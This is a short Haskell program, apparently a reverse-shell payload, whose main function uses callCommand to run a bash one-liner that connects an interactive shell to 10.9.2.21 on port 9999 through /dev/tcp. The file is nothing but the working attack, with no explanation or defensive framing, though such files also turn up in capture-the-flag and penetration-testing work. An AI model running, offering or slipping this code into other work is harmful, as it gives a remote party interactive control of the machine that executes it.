module Main where

	import System.Process
	main = callCommand "bash -c 'exec bash -i &>/dev/tcp/10.9.2.21/9999 <&1'"